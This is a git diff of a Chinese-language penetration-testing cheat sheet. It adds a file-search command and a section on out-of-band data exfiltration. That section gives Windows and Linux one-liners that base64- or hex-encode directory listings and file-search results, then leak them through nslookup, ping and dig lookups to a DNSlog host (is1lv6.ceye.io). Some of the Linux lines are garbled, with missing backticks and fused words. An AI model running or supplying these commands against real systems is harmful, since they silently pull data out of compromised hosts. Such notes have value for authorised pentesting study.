@@ -841,7 +841,8 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessio
 net start TermService
 ```
 
-## 文件查找
+## 文件搜索
+https://www.anquanke.com/post/id/245019
 
 ```
 findstr /s /i /n /d:C:\ /c:"123123" *.txt
@@ -872,10 +873,48 @@ find / -name "index.php" | xargs grep "111222"
 ```
 
 ```
-进程路径
-wmic process get name,executablepath
+updatedb && locate index.php
+```
+
 
 ```
+进程路径
+wmic process get name,executablepath
+```
+### 外带oob
+Windows
+在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。
+```
+echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&set /p ADDR=<temp2&&nslookup %ADDR%.is1lv6.ceye.io
+```
+下面这个语句，主要是过滤作用。把helo.txt文件中的“=”过滤并重新输出文件。
+```
+for /f "delims=^= tokens=1,*" %i in (helo.txt) do (echo %i>>text3.txt)
+```
+为什么在上面需要过滤=，主要是因为在执行ping命令的时候是不允许带=号的，相较于nslookup，ping命令成功率相对较高，但如果路径过长，可能会导致失败。具体多长需要大家自行试验。
+```
+echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&for /f "delims=^= tokens=1,*" %i in (temp2) do (echo %i>>temp3)&&set /p ADDR=<temp3&ping %ADDR%.is1lv6.ceye.io
+```
+如果需要外带多行命令，则需要以下语句：
+```
+where /R C: login.* > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.is1lv6.ceye.io';$j += 1; nslookup $fin }
+（b）Linux
+```
+在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。
+```
+ping pwd|tr -d '\n'|xxd -ps.is1lv6.ceye.io
+```
+base64原理和上面类似，主要是对值进行base64编码，然后替换掉“=”，即可成功外带数据。
+```
+pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io
+```
+如果有多行数据需要外带，那么请考虑下面的语句。
+```
+var=11111 && for b in $(find / -name "index.php" | xargs grep "111222"|xxd -p); do var=$((var+1)) && dig $var.$b.is1lv6.ceye.io; done
+```
+
+
+
 
 ## powershell文件下载
 
